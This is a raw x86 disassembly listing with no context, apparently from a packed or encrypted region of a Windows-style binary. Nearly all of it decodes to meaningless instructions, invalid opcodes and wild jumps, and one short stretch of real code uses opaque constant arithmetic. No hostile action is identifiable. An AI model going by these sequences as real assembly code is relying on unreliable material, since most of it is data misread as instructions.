  40312e:	dec    esp
  40312f:	xchg   ebp,eax
  403130:	inc    ebp
  403131:	jno    0x403108
  403133:	sti    
  403134:	pop    esi
  403135:	mov    ss,WORD PTR ss:[ebx]
  403138:	push   0xffffffa5
  40313a:	hlt    
  40313b:	push   ebp
  40313c:	pop    es
  40313d:	cdq    
  40313e:	adc    eax,DWORD PTR [ebp+0x25]
  403141:	cli    
  403142:	pushf  
  403143:	push   es
  403144:	ret    
  403145:	rcl    BYTE PTR [edx-0x38],cl
  403148:	out    0xe5,al
  40314a:	push   0xfffffff3
  40314c:	fild   WORD PTR [ebx-0x5b14b072]
  403152:	in     al,0xa
  403154:	dec    eax
  403155:	mov    edx,0xce0f5a77
  40315a:	in     eax,dx
  40315b:	mov    dh,0x6a
  40315d:	scas   al,BYTE PTR es:[edi]
  40315e:	add    DWORD PTR [esi+0x1298d85],0x69
  403165:	not    BYTE PTR [eax]
  403167:	pushf  
  403168:	imul   BYTE PTR [edi-0x779e9169]
  40316e:	(bad)  
  40316f:	fldcw  WORD PTR [eax]
  403171:	sti    
  403172:	jno    0x4031f2
  403174:	xor    ah,BYTE PTR [ebx-0x62]
  403177:	test   al,0x7e
  403179:	lods   al,BYTE PTR ds:[esi]
  40317a:	loopne 0x40315c
  40317c:	cmp    edx,ebp
  40317e:	xchg   ecx,eax
  40317f:	add    bh,ah
  403181:	mov    esi,0x77e4c5c3
  403186:	add    BYTE PTR [edx],bh
  403188:	ins    DWORD PTR es:[edi],dx
  403189:	pushw  cs
  40318b:	mov    ah,0x58
  40318d:	mov    BYTE PTR [ebx-0x755bb1ca],ch
  403193:	mov    dl,0x83
  403195:	pop    eax
  403196:	ins    BYTE PTR es:[edi],dx
  403197:	jle    0x403158
  403199:	shr    DWORD PTR [edi],1
  40319b:	mov    bh,0x3d
  40319d:	popa   
  40319e:	or     cl,BYTE PTR [edi+0x7d]
  4031a1:	out    dx,al
  4031a2:	and    bl,BYTE PTR [ecx-0x756cb53b]
  4031a8:	cmp    edi,DWORD PTR [ebx-0x4a2183df]
  4031ae:	nop
  4031af:	sub    al,0x9
  4031b1:	fldcw  WORD PTR [ebx+esi*2]
  4031b4:	xchg   BYTE PTR [esi-0x4],dh
  4031b7:	into   
  4031b8:	sbb    eax,0x45ca37fa
  4031bd:	cmp    edi,DWORD PTR [ecx+0x0]
  4031c0:	out    0x6c,al
  4031c2:	rcr    DWORD PTR [edx+edi*1-0x51],cl
  4031c6:	aas    
  4031c7:	jmp    0xa958066b
  4031cc:	repz mov ebp,0x7a4a2fd7
  4031d2:	jge    0x4031c6
  4031d4:	add    edi,DWORD PTR ss:[ebx+edx*8-0x56e6f16f]
  4031dc:	push   edi
  4031dd:	inc    esi
  4031de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031df:	pop    ds
  4031e0:	and    al,0x7d
  4031e2:	popf   
  4031e3:	stos   BYTE PTR es:[edi],al
  4031e4:	call   0x665145ee
  4031e9:	mov    ebx,gs
  4031eb:	aam    0x38
  4031ed:	xor    al,0x3f
  4031ef:	or     al,0x71
  4031f1:	rol    DWORD PTR [ebx+ecx*4+0x17],1
  4031f5:	mov    al,0xa1
  4031f7:	jmp    0x6a7f:0xd4d756e1
  4031fe:	pop    eax
  4031ff:	inc    esp
  403200:	rol    DWORD PTR [edi+0x69],cl
  403203:	mov    edx,0xf67b83fd
  403208:	fs pop eax
  40320a:	lds    ebp,FWORD PTR [ebx+ebx*1-0x5b]
  40320e:	ja     0x4031c2
  403210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403212:	lahf   
  403213:	retf   0x3a
  403216:	hlt    
  403217:	imul   ecx,DWORD PTR ds:0xe9385778,0xd0fe11f2
  403221:	pop    edx
  403222:	pop    edi
  403223:	in     eax,dx
  403224:	add    eax,0x5340fcf4
  403229:	cwde   
  40322a:	add    al,0x5c
  40322c:	lahf   
  40322d:	xor    al,0xd6
  40322f:	mov    eax,ds:0xf9fea7ee
  403234:	adc    edx,esi
  403236:	dec    ebp
  403237:	mov    DWORD PTR [ecx-0x52],ebx
  40323a:	jae    0x403217
  40323c:	push   es
  40323d:	lahf   
  40323e:	das    
  40323f:	ret    0x9ad0
  403242:	cld    
  403243:	out    0x4d,eax
  403245:	es in  eax,dx
  403247:	pop    ecx
  403248:	(bad)  
  403249:	push   DWORD PTR [edx+0x20e6f843]
  40324f:	mov    ebx,0xca15d64a
  403254:	push   cs
  403255:	lahf   
  403256:	fnstenv [edi+0x4e]
  403259:	loopne 0x40324a
  40325b:	lods   eax,DWORD PTR ds:[esi]
  40325c:	or     al,0x4e
  40325e:	inc    ebp
  40325f:	add    al,0x60
  403261:	and    DWORD PTR [ebp+0x4bbbe321],eax
  403267:	mov    bl,0x17
  403269:	lock jo 0x4032db
  40326c:	xor    eax,0x25e19db8
  403271:	shl    BYTE PTR [edx+0x9],0x20
  403275:	(bad)  
  403276:	out    dx,al
  403277:	xchg   esi,eax
  403278:	sbb    DWORD PTR [esi],eax
  40327a:	mov    dh,0x5f
  40327c:	inc    ecx
  40327e:	sub    al,0x5a
  403280:	xchg   ecx,eax
  403281:	call   0xc057:0xb2be71c2
  403288:	das    
  403289:	jnp    0x4032c5
  40328b:	and    al,0xd9
  40328d:	into   
  40328e:	xlat   BYTE PTR ds:[ebx]
  40328f:	mov    ebp,0xd7901915
  403294:	jmp    0x34a2c926
  403299:	and    DWORD PTR [ebx-0x3b],esp
  40329c:	jmp    0x17f1542f
  4032a1:	mov    ecx,DWORD PTR [edi-0x66e9c88d]
  4032a7:	pop    esp
  4032a8:	scas   al,BYTE PTR es:[edi]
  4032a9:	adc    BYTE PTR [esp+esi*4],0xdd
  4032ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032ae:	mov    dh,0x58
  4032b0:	mov    ch,0x1f
  4032b2:	pop    ebp
  4032b3:	xor    BYTE PTR [esi-0x53b5d4e4],ah
  4032b9:	scas   eax,DWORD PTR es:[edi]
  4032ba:	jnp    0x403294
  4032bc:	mov    esp,0xa8b65c12
  4032c1:	adc    al,0x91
  4032c3:	(bad)  
  4032c5:	inc    ecx
  4032c6:	sbb    eax,0xcd616ce
  4032cb:	sub    al,0x11
  4032cd:	mov    al,ds:0x5b7a3e2a
  4032d2:	mov    eax,0x22213434
  4032d7:	pushf  
  4032d8:	jne    0x4032a1
  4032da:	mov    eax,0x66003407
  4032df:	and    al,0x2c
  4032e1:	cs inc edx
  4032e3:	clc    
  4032e4:	push   esp
  4032e5:	out    0xb9,al
  4032e7:	call   0x29ef9cf0
  4032ec:	or     bh,BYTE PTR [ecx+0x5e]
  4032ef:	or     ecx,DWORD PTR [ecx]
  4032f1:	push   edx
  4032f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032f3:	push   edx
  4032f4:	add    al,0xba
  4032f6:	jge    0x403354
  4032f8:	inc    eax
  4032f9:	add    BYTE PTR [ebx-0xf],bl
  4032fc:	loopne 0x403379
  4032fe:	jns    0x403282
  403300:	cwde   
  403301:	inc    edx
  403302:	cmc    
  403303:	mov    edx,?
  403305:	xchg   ecx,eax
  403306:	lds    ebp,FWORD PTR [ebp-0x7ea48a49]
  40330c:	in     eax,dx
  40330d:	jle    0x40335d
  40330f:	fdiv   st,st(3)
  403311:	cmp    eax,0x71eabc70
  403316:	enter  0xb8d4,0xd1
  40331a:	outs   dx,DWORD PTR ds:[esi]
  40331b:	loop   0x403344
  40331d:	aam    0xa9
  40331f:	ror    BYTE PTR [ebp+0x1a3d4f16],0x6
  403326:	in     eax,dx
  403327:	jns    0x4032ca
  403329:	rcl    DWORD PTR [esi],1
  40332b:	mov    ch,0x54
  40332d:	and    al,0xed
  40332f:	push   es
  403330:	push   esp
  403332:	jge    0x403395
  403334:	inc    esp
  403335:	pop    ebp
  403336:	add    ebp,ebp
  403338:	dec    ebp
  403339:	jecxz  0x403337
  40333b:	mov    ch,0x73
  40333d:	ss sar ebx,cl
  403340:	jae    0x403355
  403342:	test   DWORD PTR [edi+0x4a],0xd7525164
  403349:	test   BYTE PTR [ecx+eax*2-0x3aa93f8c],al
  403350:	mov    ebp,0xb36631c9
  403355:	fwait
  403356:	ss jae 0x403357
  403359:	ret    0xe381
  40335c:	sbb    edx,DWORD PTR [edi+0x56]
  40335f:	dec    eax
  403360:	jl     0x403362
  403362:	aas    
  403363:	inc    ebx
  403364:	repz pop eax
  403366:	adc    al,0x8e
  403368:	popf   
  403369:	into   
  40336a:	inc    esp
  40336b:	and    edx,eax
  40336d:	cmp    al,0x57
  40336f:	mov    dh,0x32
  403371:	and    al,0x95
  403373:	or     edx,esp
  403375:	call   0xfe233eea
  40337a:	or     DWORD PTR [ecx-0x7d],ebx
  40337d:	mov    eax,ds:0xacadd860
  403382:	pop    edx
  403383:	and    eax,0x775af8d9
  403388:	retf   0x74f4
  40338b:	and    ebp,DWORD PTR [esi-0x21d5a14c]
  403391:	test   al,0x90
  403393:	mov    ds:0x23424a18,eax
  403398:	popa   
  403399:	mov    WORD PTR [ecx-0x4f],?
  40339c:	paddusb mm5,QWORD PTR [eax+0x1994615e]
  4033a3:	sub    DWORD PTR [ecx-0x7e],ebp
  4033a6:	inc    edi
  4033a7:	mov    ecx,0x311c0284
  4033ac:	dec    esi
  4033ad:	es dec ecx
  4033af:	call   0x7892:0xb0dfc4cd
  4033b6:	fwait
  4033b7:	push   edi
  4033b8:	sbb    DWORD PTR [eax],edx
  4033ba:	mov    ebp,0x7c8300b1
  4033bf:	pop    ss
  4033c0:	jno    0x403393
  4033c2:	pop    ebp
  4033c3:	mov    ds,WORD PTR [ecx+0x61]
  4033c6:	ja     0x40338b
  4033c8:	mov    esi,0xc73ebe7a
  4033cd:	ins    BYTE PTR es:[edi],dx
  4033ce:	out    0xf5,al
  4033d0:	xchg   edx,eax
  4033d1:	and    ah,al
  4033d3:	shl    BYTE PTR [esi-0x6b2a608f],1
  4033d9:	cmp    eax,0x9257feb6
  4033de:	mov    ds:0x4e3e1b5a,eax
  4033e3:	mov    bl,0x83
  4033e5:	jl     0x403399
  4033e7:	int    0x4c
  4033e9:	sbb    eax,DWORD PTR [eax-0x11]
  4033ec:	stos   DWORD PTR es:[edi],eax
  4033ed:	test   BYTE PTR [edx+0x6b],al
  4033f0:	aaa    
  4033f1:	cmp    dl,BYTE PTR [eax]
  4033f3:	test   DWORD PTR [ebx-0x12885838],edx
  4033f9:	jne    0x4033d7
  4033fb:	fist   WORD PTR [esp+ecx*2]
  4033fe:	fadd   QWORD PTR [ebp-0x3]
  403401:	(bad)  
  403403:	mov    ebx,0x6222054b
  403408:	(bad)  
  403409:	fwait
  40340a:	ja     0x40342a
  40340c:	cdq    
  40340d:	adc    BYTE PTR [ecx-0x19],dh
  403410:	pop    edx
  403411:	loopne 0x4033b9
  403413:	mov    DWORD PTR [ecx],ecx
  403415:	pop    edi
  403416:	aad    0xb7
  403418:	fdivr  st(7),st
  40341a:	or     BYTE PTR [edi+0x7e],dl
  40341d:	mov    ecx,0x177e67e0
  403422:	jmp    eax
  403424:	mov    eax,ds:0x27485371
  403429:	popa   
  40342a:	cwde   
  40342b:	xchg   ebx,eax
  40342c:	neg    DWORD PTR [ebp+0x33]
  40342f:	xchg   BYTE PTR [eax-0x147184cd],cl
  403435:	inc    ebx
  403436:	mov    ?,WORD PTR [ecx+0x4379b881]
  40343c:	fs add ebx,eax
  40343f:	mov    ds,WORD PTR [edi-0x3a71a749]
  403445:	fnclex 
  403447:	lods   eax,DWORD PTR ds:[esi]
  403448:	dec    esi
  403449:	mov    dh,0x46
  40344b:	pop    ecx
  40344c:	push   eax
  40344d:	fild   DWORD PTR [ebx]
  40344f:	xor    dl,BYTE PTR [ebx+0x7]
  403452:	outs   dx,DWORD PTR ds:[esi]
  403453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403454:	mov    ah,0x4
  403456:	outs   dx,DWORD PTR ds:[esi]
  403457:	fidiv  DWORD PTR [eax-0xb]
  40345a:	test   al,0x31
  40345c:	sub    al,0xd2
  40345e:	adc    BYTE PTR [esi+0x77],dl
  403461:	dec    ecx
  403462:	(bad)  
  403463:	ret    0xc2d8
  403466:	sub    BYTE PTR [edi+0x7e],al
  403469:	out    dx,al
  40346a:	fcomp  DWORD PTR [ebx+0x3fd2cac4]
  403470:	pop    esp
  403471:	sbb    al,0x71
  403473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403474:	or     BYTE PTR [edx+0x55],ah
  403477:	add    al,BYTE PTR [ebx]
  403479:	mov    eax,ds:0x3bc50677
  40347e:	leave  
  40347f:	cdq    
  403480:	rcr    ah,0x66
  403483:	dec    edi
  403484:	mov    cs:0xc026af03,al
  40348a:	xchg   ebp,eax
  40348b:	aad    0x79
  40348d:	sbb    DWORD PTR [ecx+0x1a22037],edx
  403493:	dec    esi
  403494:	xor    al,0x3e
  403496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403497:	fwait
  403498:	sbb    dl,BYTE PTR [bx+si+0x58]
  40349c:	cmp    bl,BYTE PTR ds:0x86a9e576
  4034a2:	pop    ecx
  4034a3:	fdivp  st(2),st
  4034a5:	or     BYTE PTR [ebx-0x20e804f4],bh
  4034ab:	pop    es
  4034ac:	and    eax,0xa288207b
  4034b1:	(bad)  
  4034b3:	out    dx,eax
  4034b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034b5:	jnp    0x403485
  4034b7:	sbb    esp,esp
  4034b9:	xor    bh,BYTE PTR [edi-0x78]
  4034bc:	sar    BYTE PTR [edi+0x15f7ecfe],cl
  4034c2:	jns    0x4034a3
  4034c4:	ficomp DWORD PTR [ebx-0x3b0862b6]
  4034ca:	mov    esp,0x79c8662b
  4034cf:	cmc    
  4034d0:	mov    ecx,0xd2442e5f
  4034d5:	mov    esi,0x8a8f7864
  4034da:	dec    esp
  4034db:	jl     0x403479
  4034dd:	push   es
  4034de:	outs   dx,BYTE PTR ds:[esi]
  4034df:	pop    ecx
  4034e0:	cmp    al,0xaa
  4034e2:	mov    dh,0xbd
  4034e4:	push   edx
  4034e5:	or     ecx,DWORD PTR [ecx-0x6f]
  4034e8:	mov    dh,0x4a
  4034ea:	xchg   esi,eax
  4034eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ec:	jle    0x4034dc
  4034ee:	adc    BYTE PTR ds:0x2eeffa3a,bh
  4034f4:	and    DWORD PTR [ecx-0x21ed8985],esi
  4034fa:	leave  
  4034fb:	cmp    al,BYTE PTR [ebx-0x12]
  4034fe:	xor    eax,0xdd5cc5d2
  403503:	es jb  0x40352b
  403506:	add    eax,0xa4ecb9d9
  40350b:	jp     0x403573
  40350d:	cmpxchg ah,ah
  403510:	aam    0xfa
  403512:	sbb    BYTE PTR [esi-0x72],dl
  403515:	test   cl,0xb9
  403518:	repnz cli 
  40351a:	aas    
  40351b:	pop    ss
  40351c:	sub    al,cl
  40351e:	out    dx,al
  40351f:	(bad)  
  403520:	pop    esi
  403521:	bound  edi,QWORD PTR [edi+0x3fd448d1]
  403527:	neg    DWORD PTR [esi]
  403529:	aad    0x87
  40352b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40352c:	add    al,0xcc
  40352e:	les    eax,FWORD PTR ds:0xe3fd1260
  403534:	cld    
  403535:	mov    bl,0x27
  403537:	neg    DWORD PTR ds:0x660c0354
  40353d:	icebp  
  40353e:	xchg   edx,eax
  40353f:	or     al,0x6b
  403541:	xchg   esp,eax
  403542:	out    0x4d,eax
  403544:	ror    edx,0x7d
  403547:	sbb    eax,0xd0d76b1e
  40354c:	add    bl,bl
  40354e:	ins    DWORD PTR es:[edi],dx
  40354f:	into   
  403550:	cdq    
  403551:	repz in eax,0x3a
  403554:	jae    0x403545
  403556:	pop    ebx
  403557:	jne    0x4034f8
  403559:	jge    0x40355e
  40355b:	jns    0x4034f8
  40355d:	inc    esp
  40355e:	sahf   
  40355f:	fadd   QWORD PTR [edi-0x47]
  403562:	sahf   
  403563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403564:	push   es
  403565:	sub    DWORD PTR [edi+0x7f69b6f7],edi
  40356b:	loopne 0x40354f
  40356d:	ret    
  40356e:	add    DWORD PTR [eax-0x289c1efd],eax
  403574:	push   ebx
  403575:	mov    eax,ds:0x879b0879
  40357a:	mov    dl,BYTE PTR [ebp-0x76bb6850]
  403580:	mov    edx,0x91d9a11
  403585:	cmc    
  403586:	jle    0x403531
  403588:	push   edi
  403589:	jbe    0x403581
  40358b:	add    ecx,esp
  40358d:	mov    dl,BYTE PTR [ebx-0x7]
  403590:	push   edi
  403591:	pop    ecx
  403592:	and    BYTE PTR [ecx-0x21],bl
  403595:	dec    edi
  403596:	jne    0x4035ca
  403598:	mov    cl,0x7b
  40359a:	mov    edx,0xcd379504
  40359f:	pop    ebx
  4035a0:	cmp    edx,esi
  4035a2:	mov    dl,al
  4035a4:	lds    ebx,FWORD PTR [esi+0x8a394f5]
  4035aa:	in     eax,0x44
  4035ac:	mov    dl,0x12
  4035ae:	and    DWORD PTR [esi+0x9a628d],edi
  4035b4:	(bad)  
  4035b5:	or     al,BYTE PTR [eax+0x6c]
  4035b8:	imul   esp,DWORD PTR [eax-0x13],0x50
  4035bc:	xchg   esi,eax
  4035bd:	mov    dl,0xf
  4035bf:	lods   al,BYTE PTR ds:[esi]
  4035c0:	add    dl,BYTE PTR [edx+0x73]
  4035c3:	push   cs
  4035c4:	stos   DWORD PTR es:[edi],eax
  4035c5:	push   cs
  4035c6:	xchg   edx,eax
  4035c7:	inc    esp
  4035c8:	jg     0x40361b
  4035ca:	push   ebp
  4035cb:	jp     0x4035e3
  4035cd:	pop    esi
  4035ce:	xor    dl,bl
  4035d0:	dec    ecx
  4035d1:	cmp    dl,BYTE PTR [ebx-0x22b51973]
  4035d7:	jge    0x403567
  4035d9:	xor    esi,0xffffffda
  4035dc:	or     eax,0xf8d01803
  4035e1:	outs   dx,DWORD PTR ds:[esi]
  4035e2:	push   esp
  4035e3:	adc    ch,al
  4035e5:	es je  0x4035ca
  4035e8:	push   edx
  4035e9:	cmp    DWORD PTR [ecx],0x6b9124c0
  4035ef:	in     eax,0xf
  4035f1:	add    DWORD PTR [eax+ecx*2],ebp
  4035f4:	sbb    eax,0x12028fef
  4035f9:	aam    0xfb
  4035fb:	inc    DWORD PTR ds:0xea795f20
  403601:	mov    edx,0x34352b1b
  403606:	mov    esi,0xc7af5ab3
  40360b:	in     eax,dx
  40360c:	(bad)  
  40360d:	es pop edi
  40360f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403610:	xchg   ebp,eax
  403611:	jmp    0x4035f4
  403613:	shr    DWORD PTR [ebp-0x47578935],0x8b
  40361a:	cld    
  40361b:	and    edx,DWORD PTR [ebp+0x8]
  40361e:	pop    ecx
  40361f:	adc    edx,DWORD PTR [ebp+0x6d403f05]
  403625:	fldcw  WORD PTR [ebx+0x1f]
  403628:	into   
  403629:	or     eax,0x5156031b
  40362e:	sbb    eax,0x18fa4fd0
  403633:	cld    
  403634:	(bad)  
  403635:	dec    eax
  403636:	out    dx,al
  403637:	sbb    bh,BYTE PTR [edx+0x44]
  40363a:	shr    BYTE PTR [ebx-0x183ca165],0x32
  403641:	sbb    edx,edi
  403643:	jnp    0x403646
  403645:	mov    esp,esp
  403647:	xor    DWORD PTR [ecx-0x2c26ff6f],eax
  40364d:	cmp    DWORD PTR ds:0x650ad55,0xfffffff0
  403654:	test   al,0x90
  403656:	push   esi
  403657:	ror    ebp,1
  403659:	inc    al
  40365b:	jbe    0x40367b
  40365d:	out    0x61,eax
  40365f:	in     al,dx
  403660:	iret   
  403661:	inc    edi
  403662:	jg     0x40366d
  403664:	test   DWORD PTR [esi],esi
  403666:	pop    es
  403667:	mov    dl,0xd1
  403669:	push   ebx
  40366a:	(bad)  
  40366b:	jmp    0x4036e2
  40366d:	pushf  
  40366e:	jae    0x4036e9
  403670:	cmp    esp,esp
  403672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403673:	call   0x51a8a275
  403678:	outs   dx,DWORD PTR ds:[esi]
  403679:	jae    0x403679
  40367b:	out    0xc2,eax
  40367d:	dec    edx
  40367e:	cs lock sub ebx,ebx
  403682:	mov    dl,0x2c
  403684:	sub    DWORD PTR [esi+0x3811883e],edi
  40368a:	xchg   edi,eax
  40368b:	ins    DWORD PTR es:[edi],dx
  40368c:	pop    ebp
  40368d:	mov    cl,0xed
  40368f:	inc    ebx
  403690:	push   eax
  403691:	dec    esp
  403692:	ins    DWORD PTR es:[edi],dx
  403693:	jge    0x4036d7
  403695:	mov    ecx,ebp
  403697:	iret   
  403698:	mov    ebp,0x3877ea29
  40369d:	mov    edi,0xa9f99433
  4036a2:	mov    esi,0x6729d529
  4036a7:	test   DWORD PTR [ebx+0xf],0x88cba135
  4036ae:	and    BYTE PTR [esp+eax*4],cl
  4036b1:	adc    edx,DWORD PTR [ebx]
  4036b3:	add    al,0xac
  4036b5:	sub    dh,ch
  4036b7:	xor    al,0x26
  4036b9:	or     bl,0x6d
  4036bc:	adc    ch,BYTE PTR [ebx+esi*2]
  4036bf:	mov    dh,0x87
  4036c1:	add    BYTE PTR [ecx+esi*2+0x22012f31],0x64
  4036c9:	cli    
  4036ca:	dec    eax
  4036cb:	pop    esi
  4036cc:	daa    
  4036cd:	or     edi,ebx
  4036cf:	outs   dx,DWORD PTR ds:[esi]
  4036d0:	lahf   
  4036d1:	and    dh,BYTE PTR [edx]
  4036d3:	out    dx,al
  4036d4:	xchg   ecx,eax
  4036d5:	icebp  
  4036d6:	mov    cs,WORD PTR [esp+esi*2+0x12d5c48]
  4036dd:	and    DWORD PTR [edi],0xffffffb1
  4036e0:	loopne 0x40372e
  4036e2:	jecxz  0x403691
  4036e4:	adc    dl,BYTE PTR [ebx]
  4036e6:	aas    
  4036e7:	(bad)  
  4036e8:	push   ecx
  4036e9:	rcl    DWORD PTR [edx+0xd0c4939],cl
  4036ef:	sbb    ecx,DWORD PTR [ecx]
  4036f1:	in     eax,dx
  4036f2:	push   cs
  4036f3:	mov    eax,0xfb306167
  4036f8:	mov    edx,0xe68aa60f
  4036fd:	adc    cl,dl
  4036ff:	lods   eax,DWORD PTR ds:[esi]
  403700:	xlat   BYTE PTR ds:[ebx]
  403701:	cmp    eax,0x28704880
  403706:	and    ch,ch
  403708:	mov    WORD PTR [ebp+ecx*2-0x45],gs
  40370c:	jmp    0xc9805d19
  403711:	push   ebp
  403712:	addr16 mov ds:0x50e5,al
  403716:	je     0x4036f9
  403718:	sahf   
  403719:	mov    bh,bh
  40371b:	dec    edi
  40371c:	sar    DWORD PTR [edi+0x28],0x95
  403720:	add    ecx,0x4f54700
  403726:	in     al,dx
  403727:	(bad)  
  403728:	ins    BYTE PTR es:[edi],dx
  403729:	mov    cl,0xda
  40372b:	ins    DWORD PTR es:[edi],dx
  40372c:	adc    DWORD PTR [edi],0x75efc585
  403732:	dec    ebx
  403733:	mov    dh,0x7e
  403735:	mov    DWORD PTR [edx],eax
  403737:	or     eax,0xefe25477
  40373c:	fdivr  QWORD PTR [ebp+0x9]
  40373f:	jl     0x403738
  403741:	mov    ds:0x6a1bde06,eax
  403746:	adc    DWORD PTR [ebp+0x60],ebx
  403749:	add    BYTE PTR [esi],ch
  40374b:	dec    esp
  40374c:	mov    esi,0x38da8b69
  403751:	das    
  403752:	jg     0x403791
  403754:	adc    BYTE PTR [ebx+0x19542be4],cl
  40375a:	daa    
  40375b:	jnp    0x40375c
  40375d:	pop    ebp
  40375e:	dec    edx
  40375f:	xor    cl,bl
  403761:	mov    dh,0x1e
  403763:	cwde   
  403764:	push   ds
  403765:	inc    edx
  403766:	pop    es
  403767:	iret   
  403768:	push   ecx
  403769:	pop    esi
  40376a:	xchg   esi,eax
  40376b:	cdq    
  40376c:	jb     0x4037ca
  40376e:	cmp    DWORD PTR [ebx-0x763eac5e],eax
  403774:	ss cmp dl,ch
  403777:	xor    ebx,ecx
  403779:	add    al,0xb
  40377b:	mov    eax,ds:0xb606c612
  403780:	mov    ch,0x2d
  403782:	inc    ecx
  403783:	rol    DWORD PTR [eax-0x72bd62f3],0xa0
  40378a:	shl    DWORD PTR [ecx+0x68fe062],cl
  403790:	jp     0x403790
  403792:	test   ebp,ecx
  403794:	mov    bh,0x32
  403796:	es push esi
  403798:	xor    eax,0xe299ed6b
  40379d:	lea    ebp,[edx]
  40379f:	daa    
  4037a0:	aas    
  4037a1:	ins    DWORD PTR es:[edi],dx
  4037a2:	dec    esi
  4037a3:	xchg   edx,eax
  4037a4:	adc    eax,DWORD PTR [ecx+0x5684612f]
  4037aa:	scas   eax,DWORD PTR es:[edi]
  4037ab:	and    eax,0xf9b37776
  4037b0:	sbb    DWORD PTR [esi+0x6e],0x6beff1d3
  4037b7:	lods   al,BYTE PTR ds:[esi]
  4037b8:	ds adc ecx,ebp
  4037bb:	or     DWORD PTR [ebp+0x4f],ecx
  4037be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037bf:	ins    DWORD PTR es:[edi],dx
  4037c0:	xchg   esi,eax
  4037c1:	jg     0x403795
  4037c3:	fimul  DWORD PTR [ecx-0x3]
  4037c6:	inc    edi
  4037c7:	push   ss
  4037c8:	mov    al,0x8
  4037ca:	mov    ch,0x97
  4037cc:	xor    eax,esi
  4037ce:	add    eax,edi
  4037d0:	mov    DWORD PTR [ebp-0x80],eax
  4037d3:	lea    eax,[ebp-0x80]
  4037d6:	push   eax
  4037d7:	mov    eax,DWORD PTR [ebp+0xc]
  4037da:	xor    eax,esi
  4037dc:	add    eax,edi
  4037de:	push   eax
  4037df:	mov    eax,ds:0x42830f
  4037e4:	push   0x428265
  4037e9:	push   DWORD PTR [eax]
  4037eb:	call   0x423643
  4037f0:	mov    ecx,DWORD PTR [ebp-0x10]
  4037f3:	mov    eax,DWORD PTR [ebp-0x14]
  4037f6:	mov    DWORD PTR [ebp-0x28],eax
  4037f9:	mov    DWORD PTR [ebp-0x20],0xf89c8533
  403800:	mov    edx,0xf89c85b1
  403805:	mov    DWORD PTR [ebp-0x20],edx
  403808:	lea    eax,[edx-0x1]
  40380b:	mov    DWORD PTR [ebp-0x20],eax
  40380e:	mov    DWORD PTR [ebp-0x8],edx
  403811:	mov    DWORD PTR [ebp-0x10],0xf89c85b2
  403818:	mov    edx,DWORD PTR [ebp-0x8]
  40381b:	xor    edx,esi
  40381d:	mov    ebx,0xffcd8f14
  403822:	sub    ebx,edx
  403824:	mov    DWORD PTR [ebp-0xc],ebx
  403827:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  40382e:	mov    edx,DWORD PTR [ebp-0x10]
  403831:	mov    DWORD PTR [ebp-0x24],ecx
  403834:	cmp    edx,eax
  403836:	je     0x4080be
  40383c:	mov    eax,DWORD PTR [ebp-0x8]
  40383f:	mov    edx,DWORD PTR [ebp-0x8]
  403842:	xor    eax,esi
  403844:	xor    edx,esi
  403846:	lea    ebx,[eax+edx*1+0x64e5d8]
  40384d:	mov    eax,DWORD PTR [ebp-0xc]
  403850:	xor    edx,edx
  403852:	div    ebx
  403854:	mov    eax,DWORD PTR [ebp-0x10]
  403857:	mov    ebx,DWORD PTR [ebp-0x8]
  40385a:	xor    eax,esi
  40385c:	xor    ebx,esi
  40385e:	jmp    0x405c1c
  403863:	mov    edi,0x41446183
  403868:	test   BYTE PTR [ebx-0x196ad685],cl
  40386e:	call   0x5fdd:0x8d7aaddc
  403875:	jp     0x4038f1
  403877:	fstp   QWORD PTR [edi+0x7a]
  40387a:	jp     0x403897
  40387c:	ins    BYTE PTR es:[edi],dx
  40387d:	daa    
  40387e:	scas   eax,DWORD PTR es:[edi]
  40387f:	aam    0xca
  403881:	inc    eax
  403882:	out    dx,eax
  403883:	cwde   
  403884:	push   esi
  403885:	pop    edi
  403886:	push   DWORD PTR [ecx]
  403888:	mov    bl,0x56
  40388a:	jmp    0x4038f7
  40388c:	ins    DWORD PTR es:[edi],dx
  40388d:	mov    al,ds:0x7fdfd64b
  403892:	inc    esi
  403893:	cwde   
  403894:	out    dx,al
  403895:	push   ss
  403896:	push   esi
  403897:	jne    0x403916
  403899:	and    DWORD PTR [esi],ebx
  40389b:	and    eax,0x34bf3bd1
  4038a0:	mov    dh,0x4a
  4038a2:	sbb    cl,bh
  4038a4:	mov    bl,0xf1
  4038a6:	lods   eax,DWORD PTR ds:[esi]
  4038a7:	ins    DWORD PTR es:[edi],dx
  4038a8:	jb     0x4038ca
  4038aa:	xorps  xmm0,XMMWORD PTR [esi-0x5736fa16]
  4038b1:	(bad)  
  4038b2:	pushf  
  4038b3:	fwait
  4038b4:	pusha  
  4038b5:	and    al,0x87
  4038b7:	jno    0x40387f
  4038b9:	(bad)  
  4038ba:	xchg   ecx,eax
  4038bb:	mov    edx,0xe773a734
  4038c0:	lds    edx,FWORD PTR [ebx+0x27]
  4038c3:	jne    0x403916
  4038c5:	xchg   BYTE PTR [ecx+0x522d3833],dl
  4038cb:	xor    edx,DWORD PTR ds:0xcded
  4038d0:	mov    bl,0xb3
  4038d2:	dec    eax
  4038d3:	lock lock add DWORD PTR [ebp+ebx*2+0x11],esi
  4038d9:	outs   dx,DWORD PTR ds:[esi]
  4038da:	(bad)  
  4038db:	mov    al,ds:0xdf4e46d9
  4038e0:	dec    eax
  4038e1:	mov    esp,0xb6fe5489
  4038e6:	push   es
  4038e7:	jle    0x4038d8
  4038e9:	ss jmp 0x4038b2
  4038ec:	pop    eax
  4038ed:	inc    esp
  4038ee:	scas   eax,DWORD PTR es:[edi]
  4038ef:	(bad)  
